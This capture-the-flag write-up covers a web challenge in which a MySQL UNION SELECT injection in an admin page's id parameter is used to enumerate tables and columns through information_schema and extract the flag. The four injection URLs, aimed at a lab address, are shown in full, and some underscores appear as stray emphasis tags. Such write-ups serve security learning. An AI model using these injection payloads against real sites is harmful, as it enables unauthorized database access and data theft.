<h1>Web 200 - URL Anonymizer</h1>

<blockquote>
  <p>Writeup by f0xtr0t (Jay Bosamiya)</p>
</blockquote>

<p>One of the different admin pages (namely, <code>report</code>), was vulnerable to an SQL injection from the <code>id</code> parameter. This allowed us to leak one value of one column of information directly to the output.</p>

<p>Additionally, it was easy to notice that it was using MySQL. Hence, we could use the different "special tables" in MySQL with a <code>UNION SELECT</code> based query and obtain information.</p>

<p>The most irritating part of this process was finding the number of columns in the union select attack, since (for some reason), my extensions on Firefox were messing up, and I was constantly forced to manually keep running URLencode and URLdecode :(</p>

<p>Nevertheless, using <code>group_concat()</code>, it is possible to obtain all entries in a column, as a single row, and we used that to obtain information in a very fast way.</p>

<p>Without further ado, here are the different queries that were run (URLdecoded versions, for easier reading):</p>

<p>```
http://10.13.37.12/admin.php?page=report&amp;id=asd" UNION SELECT 0,1,2,3 -- </p>

<p>http://10.13.37.12/admin.php?page=report&amp;id=asd" UNION SELECT 0,1,group<em>concat(table</em>name),3 FROM information<em>schema.tables where table</em>schema="web" -- </p>

<p>http://10.13.37.12/admin.php?page=report&amp;id=asd" UNION SELECT 0,1,group<em>concat(column</em>name),3 FROM information<em>schema.columns where table</em>schema="web" -- </p>

<p>http://10.13.37.12/admin.php?page=report&amp;id=asd" UNION SELECT 0,1,group_concat(flag),3 FROM flag -- 
```</p>

<p>The <code>flag</code> column in the <code>flag</code> table had the flag :)</p>
